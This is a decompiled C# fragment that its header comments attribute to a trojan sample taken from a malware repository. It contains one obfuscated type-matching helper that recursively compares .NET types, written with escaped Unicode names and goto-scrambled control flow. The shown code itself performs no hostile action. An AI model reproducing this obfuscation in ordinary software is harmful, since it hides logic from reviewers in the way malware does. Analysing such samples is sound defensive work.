// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Ugyzlkqxhz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 36C42683-5959-4132-14CD-452F458D436C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\VHO-Trojan.Win32.Sdum.gen-4a8dd354270640e1f224c81a20ef8fe72cb21c70497b1226a189ab89a38421e0.exe

using System;

internal static class \u0002\u2005
{
  public static bool \u0002(Type _param0, Type _param1, out int _param2)
  {
    _param2 = 0;
    if ((object) _param0 == (object) _param1)
    {
      _param2 = 1;
      return true;
    }
    if ((object) _param0 == null || (object) _param1 == null)
      return false;
    if (_param0.IsByRef)
      return _param1.IsByRef && \u0002\u2005.\u0002(_param0.GetElementType(), _param1.GetElementType(), out _param2);
    if (_param1.IsByRef)
      return false;
    if (_param0.IsPointer)
      return _param1.IsPointer && \u0002\u2005.\u0002(_param0.GetElementType(), _param1.GetElementType(), out _param2);
    if (_param1.IsPointer)
      return false;
    if (_param0.IsArray)
      return _param1.IsArray && _param0.GetArrayRank() == _param1.GetArrayRank() && \u0002\u2005.\u0002(_param0.GetElementType(), _param1.GetElementType(), out _param2);
    if (_param1.IsArray || _param0.IsGenericType != _param1.IsGenericType)
      return false;
    if (_param0.IsGenericType)
    {
      Type type1 = _param0.IsGenericTypeDefinition ? _param0 : _param0.GetGenericTypeDefinition();
      Type type2 = _param1.IsGenericTypeDefinition ? _param1 : _param1.GetGenericTypeDefinition();
      if (true)
        goto label_25;
label_24:
      Type type3;
      Type type4 = type3;
      if ((object) type1 != (object) type4)
        return false;
      Type[] genericArguments1 = _param0.GetGenericArguments();
      if (true)
        goto label_30;
label_28:
      Type[] genericArguments2 = _param1.GetGenericArguments();
      if (true)
        goto label_31;
label_29:
      Type[] typeArray1;
      Type[] typeArray2;
      if (typeArray1.Length != typeArray2.Length)
        return false;
      int index;
      if (true)
        index = 0;
      while (index < typeArray1.Length)
      {
        int num1;
        if (\u0002\u2005.\u0002(typeArray1[index], typeArray2[index], out num1))
          _param2 += num1;
        int num2 = index + 1;
        if (true)
          index = num2;
      }
      goto label_42;
label_31:
      typeArray2 = genericArguments2;
      goto label_29;
label_30:
      typeArray1 = genericArguments1;
      goto label_28;
label_25:
      type3 = type2;
      goto label_24;
    }
    else if ((object) _param0 != (object) _param1)
      return false;
label_42:
    ++_param2;
    return true;
  }
}
